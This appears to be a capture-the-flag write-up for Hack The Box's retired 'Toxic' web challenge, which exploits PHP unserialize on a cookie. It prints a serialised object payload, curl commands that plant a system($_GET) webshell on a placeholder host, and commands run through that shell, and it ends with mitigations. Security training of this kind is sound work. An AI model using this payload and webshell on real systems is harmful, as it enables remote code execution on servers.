---
challenge: Toxic
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, php, deserialization, object-injection, magic-methods]
---

# Toxic — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

The app stores a **serialised PHP object in a cookie** and passes it through `unserialize` on every request. One class has a `__destruct` magic method that writes a file named after one of its properties. Inject an object whose `logFile` points at a `.php` file in the webroot and `__destruct` leaves a webshell behind.

## Brief

A site with a landing page and a session cookie that changes per visit. No login, no form: all the state travels in the cookie.

## Analysis

```php
class Toxic {
    public $logFile;
    public function __destruct() {
        file_put_contents($this->logFile, "<?php system(\$_GET['c']); ?>");
    }
}

if (isset($_COOKIE['PHPSESSID'])) {
    $obj = unserialize(base64_decode($_COOKIE['PHPSESSID']));
}
```

Two key details:

1. There is no class allowlist: any loaded class can be instantiated from the cookie.
2. The filename is unvalidated, so it can point anywhere inside the webroot.

## Exploitation

Build the object with the same class name and public property:

```php
O:5:"Toxic":1:{s:7:"logFile";s:9:"shell.php";}
```

Base64-encode it and send it as the cookie:

```bash
PAYLOAD=$(printf 'O:5:"Toxic":1:{s:7:"logFile";s:9:"shell.php";}' | base64 -w0)
curl -s -b "PHPSESSID=$PAYLOAD" http://<IP>:<port>/
curl -s "http://<IP>:<port>/shell.php?c=id"
```

The first request destroys the object at shutdown and writes `shell.php`; the second runs commands.

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`c=cat /flag*` prints the flag.

## Pitfalls

- **Property length**: `s:7:"logFile"` counts characters exactly; one byte off breaks deserialisation and the cookie is silently ignored.
- **Base64 line breaks**: use `-w0` so the cookie is not cut.
- **Webroot path**: if `/var/www/html` is not writable, try `uploads/` or a subdirectory with permissions.

## Lessons

- `unserialize` on client data is code execution through magic methods, not just data reading.
- `__destruct`, `__wakeup` and `__toString` are the usual PHP object-injection hooks.
- Mitigation: `json_decode` for client state, `allowed_classes => false`, and server-generated filenames.
